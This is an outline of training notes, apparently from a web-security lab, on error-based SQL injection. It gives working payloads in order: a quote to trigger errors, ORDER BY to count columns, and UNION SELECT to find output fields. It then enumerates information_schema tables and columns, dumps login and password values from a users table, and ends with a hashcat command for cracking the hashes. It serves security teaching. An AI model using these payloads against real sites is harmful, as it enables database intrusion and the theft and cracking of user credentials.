Error-based SQLi Attacks
Objectives:

    Explain and demonstrate how to use Error-based SQLi to access sensitive information

    What do we mean by 'error' based?
        Make web app print SQL error to screen
            Confirms the SQL injection

    How do we do this?
        Testing for injection
            The single-quote (') is your friend
                Double-quotes can work as well

    Now that we have a possible injection point, where do we go next?
        ORDER BY
            Sorts results in set by ascending or descending order
                Or in this case by column number
            iron' order by 1 --
                Increase the number by 1 until you receive an error
                    Now you know how many columns

    Now that we have the columns identified, what do we do next?
        UNION SELECT
            iron' union select 1,2,3,4,5,6,7 --
                You can now see where usable areas are
                    They will be selected for output fields
                        iron' union select 1,user(),3,4,@@version,6,7 --

    So, we're now interacting with the SQL database and it just dumps info to the web page! If we have this kind of control, where do we go from here?
        TABLE enum
            ...1,table_name,3,4,5,6,7 FROM information_schema.tables --
        COLUMN enum
            ...1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='users' --
        Read COLUMN info
            ...1,login,3,4,password,6,7 FROM users --
                Save creds to file
                Check hash type with hash-identifier and crack with hashcat
                    hashcat -m 100 -a 0 nixPass.txt /usr/share/wordlists/rockou.txt --force
